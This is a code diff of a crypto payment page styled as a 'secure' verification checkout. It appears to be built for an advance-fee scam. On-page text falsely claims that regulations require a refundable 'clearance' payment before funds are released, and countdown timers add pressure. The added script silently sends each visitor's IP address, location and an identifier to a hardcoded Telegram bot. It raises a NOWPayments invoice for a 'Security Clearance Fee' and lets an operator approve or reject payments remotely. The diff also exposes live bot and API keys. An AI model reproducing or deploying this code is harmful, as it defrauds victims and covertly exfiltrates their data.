@@ -38,33 +38,44 @@
         text-align: center;
     }
 
-    .glass-card {
-      background: rgba(255,255,255,0.12);
-      backdrop-filter: blur(12px);
-      border-radius: 18px;
-      padding: 28px;
-      margin: 80px auto 30px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-      max-width: 280px !important;
-    }
+.glass-card {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 280px !important;
+}
 
-    .checkbox-container {
-      display: flex;
-      flex-direction: row-reverse;
-      align-items: flex-end;
-      justify-content: space-between;
-      gap: 16px;
-      margin-top: 14px;
-    }
+.checkbox-container {
+  display: flex;
+  flex-direction: row-reverse;
+  align-items: flex-end;
+  justify-content: space-between;
+  gap: 16px;
+  margin-top: 14px;
+}
 
-    .checkbox-container input {
-      margin-bottom: 4px;
-      cursor: pointer;
-    }
+.checkbox-container input {
+  margin-bottom: 4px;
+  cursor: pointer;
+}
 
-    .checkbox-container label {
-      flex: 1;
-    }
+.checkbox-container label {
+  flex: 1;
+}
+
+.neon-card.warning {
+  animation: warning-glow 0.8s ease-in-out 2;
+  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
+}
+
+@keyframes warning-glow {
+  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
+  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+}
 
     #payment-container {
         background-color: var(--card-bg);
@@ -134,6 +145,19 @@
         transition: width 0.6s ease;
         background: var(--accent-red);
         box-shadow: 0 0 20px rgba(79,172,254,0.6);
+    }
+
+    .progress-fill::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+        animation: energyFlow 2.5s linear infinite;
+    }
+
+    @keyframes energyFlow {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
     }
 
     .plan-pay {
@@ -235,15 +259,160 @@
         z-index: 9999;
         opacity: 0;
         max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
     }
 
     .notification-bar.show { top: 20px; opacity: 1; }
+
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+
+    @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
 
     .walletconnect-actions {
         margin-top: 20px;
         display: flex;
         flex-direction: column;
         gap: 12px;
+    }
+
+    .status-animation-container {
+        margin-top: 18px;
+        font-family: 'Georgia', sans-serif; 
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        width: 100%;
+    }
+
+    .payment-line-wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        width: 100%;
+        color: #0ff;
+        font-size: 0.9rem;
+        font-weight: bold;
+        text-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
+    }
+
+    .label-text {
+        letter-spacing: 1px;
+        transition: color 0.4s ease, text-shadow 0.4s ease;
+    }
+
+    .cyber-line-track {
+        flex: 1;
+        max-width: 160px;
+        height: 3px;
+        background: rgba(0, 255, 255, 0.2);
+        border-radius: 4px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .cyber-line-pulse {
+        position: absolute;
+        top: 0;
+        left: -40%;
+        width: 40%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, #0ff, transparent);
+        box-shadow: 0 0 8px #0ff;
+        animation: bouncePulse 1.2s ease-in-out infinite alternate;
+    }
+
+    @keyframes bouncePulse {
+        0% { left: -10%; }
+        100% { left: 70%; }
+    }
+
+    .checkmark-wrapper {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 22px;
+        height: 22px;
+        margin-left: 4px;
+        opacity: 0;
+        transform: scale(0.5);
+        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    .checkmark-wrapper.active {
+        opacity: 1;
+        transform: scale(1);
+    }
+
+    .checkmark-svg {
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        display: block;
+        stroke-width: 3;
+        stroke: #10b981;
+        stroke-miterlimit: 10;
+        box-shadow: inset 0px 0px 0px #10b981;
+        animation: fillCircle .4s ease-in-out .4s forwards;
+    }
+
+    .checkmark-circle {
+        stroke-dasharray: 166;
+        stroke-dashoffset: 166;
+        stroke-width: 3;
+        stroke-miterlimit: 10;
+        stroke: #10b981;
+        fill: none;
+        animation: strokeCircle 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+    }
+
+    .checkmark-check {
+        transform-origin: 50% 50%;
+        stroke-dasharray: 48;
+        stroke-dashoffset: 48;
+        animation: strokeCheck 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.5s forwards;
+    }
+
+    @keyframes strokeCircle {
+        100% { stroke-dashoffset: 0; }
+    }
+
+    @keyframes strokeCheck {
+        100% { stroke-dashoffset: 0; }
+    }
+
+    @keyframes fillCircle {
+        100% { box-shadow: inset 0px 0px 0px 30px rgba(16, 185, 129, 0.2); }
+    }
+
+    .payment-line-wrapper.success .label-text.received {
+        color: #10b981;
+        text-shadow: 0 0 10px rgba(16, 185, 129, 0.8);
+    }
+
+    .payment-line-wrapper.success .cyber-line-track {
+        background: rgba(16, 185, 129, 0.3);
+    }
+
+    .payment-line-wrapper.success .cyber-line-pulse {
+        animation: none;
+        left: 0;
+        width: 100%;
+        background: #10b981;
+        box-shadow: 0 0 10px #10b981;
+        transition: all 0.4s ease;
     }
 
     .wallet-btn {
@@ -263,17 +432,31 @@
         transform: translateY(-2px);
         box-shadow: 0 0 18px rgba(107,44,216,0.7), 0 0 36px rgba(155,89,182,0.45);
     }
+
+    @media (max-width: 400px) {
+        #payment-container {
+            padding: 20px 15px;
+            max-width: 300px;
+        }
+        .amount {
+            font-size: 1.4rem;
+        }
+        p {
+            font-size: 0.9rem;
+        }
+    }
     </style>
 </head>
 
 <body>
 
   <div id="content">
+
     <div id="planNotification" class="notification-bar"></div>
 
     <div id="payment-container">
       <div class="header">
-        <span class="badge">Secure Gateway Checkout</span>
+        <span class="badge">Action Required</span>
       </div>
 
       <div id="tokenSelector">
@@ -284,7 +467,9 @@
       <!-- USDT Card -->
       <div class="token-card" id="usdt-card">
         <div class="plan-pay">
-          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="Tether Logo">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
+               alt="Tether Logo">
           <span class="token-name">USDT</span>
           <span class="network">ERC-20</span>
         </div>
@@ -295,8 +480,8 @@
         </div>
 
         <div class="walletconnect-actions">
-          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handleHostedCheckout('USDT')">
-            Proceed to Secure Payment 
+          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handleWalletAction()">
+            Proceed to NOWPayments 
           </button>
         </div>
         <p id="usdt-timer">Verification expires in 05:00</p>
@@ -309,7 +494,9 @@
       <!-- USDC Card -->
       <div class="token-card inactive" id="usdc-card">
         <div class="plan-pay">
-          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USD Coin Logo">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
+               alt="USD Coin Logo">
           <span class="token-name">USDC</span>
           <span class="network">ERC-20</span>
         </div>
@@ -320,8 +507,8 @@
         </div>
 
         <div class="walletconnect-actions">
-          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handleHostedCheckout('USDC')">
-            Proceed to Secure Payment  
+          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handleWalletAction()">
+            Proceed to NOWPayments  
           </button>
         </div>
         <p id="usdc-timer">Verification expires in 05:00</p>
@@ -332,11 +519,19 @@
       </div>
     </div>
 
-    <div class="glass-card" style="margin:30px auto;">
+    <div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
       <div class="checkbox-container">
         <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
         <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
-          <span style="display: block; margin: 12px 0; padding-left: 12px; border-left: 3px solid rgba(200, 50, 80, 0.85); color: rgba(255, 255, 255, 0.85); font-size: 10px; font-weight: bold;">  
+          <span style="  
+            display: block;  
+            margin: 12px 0;  
+            padding-left: 12px;  
+            border-left: 3px solid rgba(200, 50, 80, 0.85);  
+            color: rgba(255, 255, 255, 0.85);  
+            font-size: 10px;
+            font-weight: bold; 
+          ">  
             Because your incoming transaction falls below minimum reporting thresholds, standard cross-border clearance regulations require the above refundable verification protocol before disbursement.
           </span>
         </label>
@@ -345,23 +540,63 @@
           Automated Clearance System • Security Protocol SSL-256
       </div>
     </div>
+
   </div>
 
 <script>
     const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
     const TELEGRAM_CHAT_ID = "-1003913850436";
+    const NOWPAYMENTS_API_KEY = "1W94E6X-SH0M961-P9FQ8D2-2PRWZTZ"; // Replace with your actual NOWPayments API key
 
     let timerInterval;
-    const SOURCE_TOKEN_KEY = "avb_expiry_times";
-    const totalDuration = 30 * 60 * 1000;
-    
-    let expiryTime = localStorage.getItem(SOURCE_TOKEN_KEY);
-    if (!expiryTime) {
-        expiryTime = Date.now() + totalDuration;
-        localStorage.setItem(SOURCE_TOKEN_KEY, expiryTime);
+    let telegramPollInterval = null;
+    let paymentDone = false;
+
+    const SOURCE_TIMER_KEY = "avb_expiry_times";
+
+    function getTargetUserIdentifier() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let identifyUser = urlParams.get('user');
+
+        if (!identifyUser) {
+            identifyUser = sessionStorage.getItem('av_session_uid');
+            if (!identifyUser) {
+                identifyUser = 'User_' + Math.random().toString(36).substring(2, 8);
+                sessionStorage.setItem('av_session_uid', identifyUser);
+            }
+        }
+        return identifyUser.trim();
     }
 
-    let calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "2133.33").toFixed(2);
+    const totalDuration = 30 * 60 * 1000;
+    let expiryTime = localStorage.getItem(SOURCE_TIMER_KEY);
+
+    if (expiryTime) {
+        expiryTime = parseInt(expiryTime, 10);
+        const remaining = expiryTime - Date.now();
+        if (remaining <= 0) {
+            localStorage.removeItem("avalonflowAmount");
+            localStorage.removeItem(SOURCE_TIMER_KEY);
+            localStorage.removeItem("avalonflowRandomDecimal");
+            expiryTime = null;
+        }
+    }
+
+    if (!expiryTime) {
+        expiryTime = Date.now() + totalDuration;
+        localStorage.setItem(SOURCE_TIMER_KEY, expiryTime);
+    }
+
+    const storageKey = "avalonflowAmount_custom";
+    const rawBonus = localStorage.getItem("av_converted_amount") || localStorage.getItem("av_retention_bonus");
+    let calculatedBaseAmount;
+
+    if (rawBonus && !isNaN(parseFloat(rawBonus))) {
+        calculatedBaseAmount = (parseFloat(rawBonus) * 0.0400).toFixed(2);
+    } else {
+        calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "2133.33").toFixed(2);
+    }
+
     let randomDecimal = localStorage.getItem("avalonflowRandomDecimal");
     if (!randomDecimal) {
         randomDecimal = (Math.floor(Math.random() * 10000) / 10000).toString();
@@ -369,35 +604,312 @@
     }
 
     let expectedAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
-    document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
-    document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+    localStorage.setItem("avalonflowAmount", expectedAmount);
 
-    window.showTokenCard = function(selectedToken) {
-        document.querySelectorAll(".token-card").forEach(card => card.classList.add("inactive"));
-        document.getElementById(`${selectedToken}-card`).classList.remove("inactive");
+    let activeToken = "USDT";
 
-        document.getElementById("usdt-btn").classList.toggle("active", selectedToken === 'usdt');
-        document.getElementById("usdc-btn").classList.toggle("active", selectedToken === 'usdc');
-    };
+    async function initializeAppWithIP() {
+        let ipData = {};
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+            ipData = await ipResponse.json();
+        } catch (err) {
+            ipData = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
+        }
 
-    window.handleHostedCheckout = function(tokenType) {
-        triggerNotification(`Redirecting to secure ${tokenType} payment gateway...`, 2500);
+        if (!sessionStorage.getItem('visitor_logged_tg')) {
+            await sendVisitorDetailsToTelegram(ipData);
+        }
+    }
 
-        // Notify Telegram that the user clicked to pay via API processor
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: `🚀 <b>Hosted Gateway Redirect Triggered</b>\n• Token: <code>${tokenType}</code>\n• Amount: <code>$${expectedAmount}</code>`,
-                parse_mode: 'HTML'
-            })
-        }).catch(err => console.warn(err));
+    async function sendVisitorDetailsToTelegram(ipData) {
+        try {
+            const rawAgent = navigator.userAgent;
+            if (/bot|googlebot|crawler|spider|robot/i.test(rawAgent)) return;
+
+            const identifyUser = getTargetUserIdentifier();
+            const currentPage = window.location.pathname;
+            const messageText = `⚡ <b>Crypto Checkout Session Started | AvalonFlow</b>\n\n` +
+                                `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                                `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
+                                `💰 <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
+                                `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                                `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
+                                `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: 'HTML' })
+            });
+
+            sessionStorage.setItem('visitor_logged_tg', 'true');
+        } catch (err) {
+            console.warn("Telegram telemetry error:", err);
+        }
+    }
+
+    function initiatePaymentAnimationUI() {
+        const usdtProgress = document.getElementById("usdt-progress");
+        const usdcProgress = document.getElementById("usdc-progress");
+        const usdtTimer = document.getElementById("usdt-timer");
+        const usdcTimer = document.getElementById("usdc-timer");
+
+        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "none";
+        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "none";
+        if (usdtTimer) usdtTimer.style.display = "none";
+        if (usdcTimer) usdcTimer.style.display = "none";
+
+        const usdtCard = document.getElementById("usdt-card");
+        const usdcCard = document.getElementById("usdc-card");
+
+        const statusHTML = `
+            <div class="status-animation-container" id="active-status-container">
+                <div class="payment-line-wrapper">
+                    <span class="label-text">Sent</span>
+                    <div class="cyber-line-track">
+                        <div class="cyber-line-pulse"></div>
+                    </div>
+                    <span class="label-text received">Received</span>
+                    <div class="checkmark-wrapper">
+                        <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                            <circle class="checkmark-circle" cx="26" cy="26" r="23" fill="none"/>
+                            <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        if (usdtCard && !usdtCard.querySelector("#active-status-container")) usdtCard.insertAdjacentHTML('beforeend', statusHTML);
+        if (usdcCard && !usdcCard.querySelector("#active-status-container")) usdcCard.insertAdjacentHTML('beforeend', statusHTML);
+    }
+
+    function completePaymentAnimationUI(redirectUrl) {
+        const wrappers = document.querySelectorAll(".payment-line-wrapper");
+        wrappers.forEach(wrapper => wrapper.classList.add("success"));
+
+        const checkmarks = document.querySelectorAll(".checkmark-wrapper");
+        checkmarks.forEach(cm => cm.classList.add("active"));
+
+        triggerNotification("Verification Successful. Redirecting...", 3000);
 
         setTimeout(() => {
-            // Replace this with your actual hosted payment provider invoice URL or integration link
-            window.location.href = `https://nowpayments.io/payment?iv_amount=${expectedAmount}&iv_currency=${tokenType.toLowerCase()}`;
-        }, 1500);
+            window.location.replace(redirectUrl || "https://membership.avalonflow.site/dashboard");
+        }, 1800);
+    }
+
+    async function streamPaymentVerificationToTelegram(invoiceId = "NOWPayments Invoice") {
+        try {
+            const identifyUser = getTargetUserIdentifier();
+            const telegramMessage = 
+              `💳 <b>NOWPayments Invoice Generated</b>\n\n` +
+              `• <b>User ID:</b> <code>${identifyUser}</code>\n` +
+              `• <b>Token:</b> <code>${activeToken}</code>\n` +
+              `• <b>Amount:</b> <code>$${expectedAmount}</code>\n` +
+              `• <b>Invoice ID:</b> <code>${invoiceId}</code>`;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve Transaction", callback_data: `approve:${identifyUser}` },
+                        { text: "❌ Reject Transaction", callback_data: `reject:${identifyUser}` }
+                    ]
+                ]
+            };
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: telegramMessage,
+                    parse_mode: 'HTML',
+                    reply_markup: inlineKeyboard
+                })
+            });
+
+            startTelegramPolling(identifyUser, invoiceId);
+        } catch (error) {
+            console.error('Failed to notify Telegram admin:', error);
+        }
+    }
+
+    async function acknowledgeTelegramAction(callbackId, messageId, originalText, statusStamp) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ callback_query_id: callbackId, text: statusStamp })
+            });
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    message_id: messageId,
+                    text: `${originalText || ''}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.warn("Failed to acknowledge Telegram action:", e);
+        }
+    }
+
+    let telegramLastUpdateId = 0;
+
+    function startTelegramPolling(targetUser, invoiceId) {
+        if (telegramPollInterval) clearInterval(telegramPollInterval);
+
+        telegramPollInterval = setInterval(async () => {
+            try {
+                const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
+                const data = await response.json();
+                if (!data.ok || !data.result || data.result.length === 0) return;
+
+                for (const update of data.result) {
+                    telegramLastUpdateId = update.update_id;
+
+                    if (update.callback_query && update.callback_query.data) {
+                        const callbackData = update.callback_query.data;
+                        const callbackId = update.callback_query.id;
+                        const messageId = update.callback_query.message?.message_id;
+                        const originalText = update.callback_query.message?.text || "";
+
+                        if (callbackData === `approve:${targetUser}`) {
+                            clearInterval(telegramPollInterval);
+                            await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
+
+                            localStorage.setItem("step_3_paid", "true");
+                            localStorage.setItem("step_3_txn_id", invoiceId);
+
+                            localStorage.removeItem("av_payment_in_progress");
+                            localStorage.removeItem(storageKey);
+                            localStorage.removeItem(SOURCE_TIMER_KEY);
+                            localStorage.removeItem("avalonflowRandomDecimal");
+
+                            const redirectUrl = `https://membership.avalonflow.site/notifications?invoice=${invoiceId}`;
+                            completePaymentAnimationUI(redirectUrl);
+                            break;
+                        } 
+                        else if (callbackData === `reject:${targetUser}`) {
+                            clearInterval(telegramPollInterval);
+                            await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");
+
+                            localStorage.removeItem("av_payment_in_progress");
+
+                            const statusContainers = document.querySelectorAll("#active-status-container");
+                            statusContainers.forEach(container => container.remove());
+
+                            const usdtProgress = document.getElementById("usdt-progress");
+                            const usdcProgress = document.getElementById("usdc-progress");
+                            const usdtTimer = document.getElementById("usdt-timer");
+                            const usdcTimer = document.getElementById("usdc-timer");
+
+                            if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
+                            if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
+                            if (usdtTimer) usdtTimer.style.display = "";
+                            if (usdcTimer) usdcTimer.style.display = "";
+
+                            paymentDone = false;
+
+                            triggerNotification("Verification failed", 4000);
+                            break;
+                        }
+                    }
+                }
+            } catch (err) {
+                console.warn("Telegram polling interval check active...");
+            }
+        }, 2500);
+    }
+
+    window.handleWalletAction = async function() {
+      if (paymentDone) return;
+
+      try {
+        paymentDone = true;
+        localStorage.setItem("av_payment_in_progress", "true");
+
+        initiatePaymentAnimationUI();
+        triggerNotification("Generating NOWPayments invoice...", 3000);
+
+        const identifyUser = getTargetUserIdentifier();
+        
+        // Request NOWPayments Invoice creation
+        const response = await fetch('https://api.nowpayments.io/v1/invoice', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-api-key': NOWPAYMENTS_API_KEY
+            },
+            body: JSON.stringify({
+                price_amount: parseFloat(expectedAmount),
+                price_currency: 'usd',
+                pay_currency: activeToken.toLowerCase(),
+                order_id: identifyUser,
+                order_description: `Security Clearance Fee for ${identifyUser}`,
+                success_url: `https://membership.avalonflow.site/notifications?user=${identifyUser}`,
+                cancel_url: window.location.href
+            })
+        });
+
+        const data = await response.json();
+        
+        if (data && data.invoice_url) {
+            triggerNotification("Sending details to admin & redirecting...", 2000);
+            await streamPaymentVerificationToTelegram(data.id || "NOWP_INV_" + Date.now());
+            setTimeout(() => {
+                window.location.href = data.invoice_url;
+            }, 1500);
+        } else {
+            throw new Error("Failed to generate payment invoice.");
+        }
+      } catch (error) {
+        console.error("NOWPayments error", error);
+        localStorage.removeItem("av_payment_in_progress");
+        paymentDone = false;
+
+        const statusContainers = document.querySelectorAll("#active-status-container");
+        statusContainers.forEach(container => container.remove());
+
+        const usdtProgress = document.getElementById("usdt-progress");
+        const usdcProgress = document.getElementById("usdc-progress");
+        const usdtTimer = document.getElementById("usdt-timer");
+        const usdcTimer = document.getElementById("usdc-timer");
+
+        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
+        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
+        if (usdtTimer) usdtTimer.style.display = "";
+        if (usdcTimer) usdcTimer.style.display = "";
+
+        triggerNotification("Payment initialization failed", 3000);
+      }
+    };
+
+    window.showTokenCard = function(selectedToken) {
+        activeToken = selectedToken.toUpperCase();
+        const cards = document.querySelectorAll(".token-card");
+        cards.forEach(card => card.classList.add("inactive"));
+        const activeCard = document.getElementById(`${selectedToken}-card`);
+        if (activeCard) activeCard.classList.remove("inactive");
+
+        const btnUsdt = document.getElementById("usdt-btn");
+        const btnUsdc = document.getElementById("usdc-btn");
+
+        if (btnUsdt && btnUsdc) {
+            if (selectedToken === "usdt") {
+                btnUsdt.classList.add("active");
+                btnUsdc.classList.remove("active");
+            } else {
+                btnUsdt.classList.remove("active");
+                btnUsdc.classList.add("active");
+            }
+        }
     };
 
     function triggerNotification(message, duration = 3000) {
@@ -408,30 +920,65 @@
         setTimeout(() => notification.classList.remove("show"), duration);
     }
 
-    function updateTimer() {
-        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TOKEN_KEY), 10) || expiryTime;
-        const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
-        const percentage = Math.max(0, (remaining / (totalDuration / 1000)) * 100);
+    initializeAppWithIP();
+    showTokenCard("usdt");
 
-        document.getElementById("usdt-progress").style.width = percentage + "%";
-        document.getElementById("usdc-progress").style.width = percentage + "%";
+    const usdtAmountEl = document.getElementById("usdt-amount");
+    const usdcAmountEl = document.getElementById("usdc-amount");
+    if (usdtAmountEl) usdtAmountEl.innerText = "$" + expectedAmount;
+    if (usdcAmountEl) usdcAmountEl.innerText = "$" + expectedAmount;
+
+    if (localStorage.getItem("av_payment_in_progress") === "true") {
+        paymentDone = true;
+        initiatePaymentAnimationUI();
+        const identifyUser = getTargetUserIdentifier();
+        startTelegramPolling(identifyUser, "Resumed Session Request");
+    }
+
+    function updateTimer() {
+        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
+        const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
+
+        const totalSeconds = totalDuration / 1000;
+        const percentage = Math.max(0, (remaining / totalSeconds) * 100);
+
+        const usdtProgress = document.getElementById("usdt-progress");
+        const usdcProgress = document.getElementById("usdc-progress");
+
+        if (usdtProgress) usdtProgress.style.width = percentage + "%";
+        if (usdcProgress) usdcProgress.style.width = percentage + "%";
 
         const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
         const seconds = String(remaining % 60).padStart(2, "0");
-        
-        const timeString = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
-        document.getElementById("usdt-timer").innerText = timeString;
-        document.getElementById("usdc-timer").innerText = timeString;
 
-        if (remaining <= 0) {
+        const usdtTimerEl = document.getElementById("usdt-timer");
+        const usdcTimerEl = document.getElementById("usdc-timer");
+
+        if (usdtTimerEl) usdtTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
+        if (usdcTimerEl) usdcTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
+
+        if (remaining <= 0 && !paymentDone) {
+            paymentDone = true;
+
+            localStorage.removeItem("av_payment_in_progress");
+            localStorage.removeItem("avalonflowAmount");
+            localStorage.removeItem(SOURCE_TIMER_KEY);
+            localStorage.removeItem(storageKey);
+            localStorage.removeItem("avalonflowRandomDecimal");
+
             clearInterval(timerInterval);
-            localStorage.clear();
-            window.location.replace("https://membership.avalonflow.site/notifications");
+
+            try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }
+
+            setTimeout(() => {
+                window.location.replace("https://membership.avalonflow.site/notifications");
+            }, 3200);
         }
     }
 
     timerInterval = setInterval(updateTimer, 1000);
     updateTimer();
-</script>
+  </script>
+
 </body>
 </html>
